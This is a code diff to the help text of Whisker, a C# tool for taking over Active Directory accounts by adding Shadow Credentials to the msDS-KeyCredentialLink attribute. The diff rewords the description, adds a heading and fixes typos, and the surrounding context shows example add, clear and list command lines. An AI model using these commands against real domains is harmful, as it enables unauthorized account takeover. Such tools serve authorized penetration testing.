@@ -166,9 +166,12 @@ namespace Whisker
         {
             string usage = @"
                                                                              
-  Whisker allows for the manipulation of the msDS-KeyCredentialLink attribute of Active Directory user and computer
-  accounts to allow for the takeover of user and computer objects.
-
+  Whisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their 
+  msDS-KeyCredentialLink attribute, effectively adding Shadow Credentials to the target account.
+  
+  Usage
+  =====
+  
   Add a new value to the msDS-KeyCredentialLink attribute of a target object:
   Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1
   /target:<samAccountName>      Required. Set the target name. Computer objects should end with a '$' sign.
@@ -197,7 +200,7 @@ namespace Whisker
   Whisker.exe clear /target:computername$ /domain:constoso.local /dc:dc1.contoso.local 
   /target:<samAccountName>      Required. Set the target name. Computer objects should end with a '$' sign.
   /domain:<FQDN>      Optional. Set the target Fully Qualified Domain Name (FQDN). If not provided, will try to
-  resolvethe FQDN of the current user.
+  resolve the FQDN of the current user.
   /dc:<IP/HOSTNAME>   Optional.        Set the target Domain Controller (DC). If not provided, will try to target the
   Primary Domain Controller (PDC).
 
@@ -209,7 +212,7 @@ namespace Whisker
   Whisker.exe list /target:computername$ /domain:constoso.local /dc:dc1.contoso.local 
   /target:<samAccountName>      Required. Set the target name. Computer objects should end with a '$' sign.
   /domain:<FQDN>      Optional. Set the target Fully Qualified Domain Name (FQDN). If not provided, will try to
-  resolvethe FQDN of the current user.
+  resolve the FQDN of the current user.
   /dc:<IP/HOSTNAME>   Optional.        Set the target Domain Controller (DC). If not provided, will try to target
   the Primary Domain Controller (PDC).
 
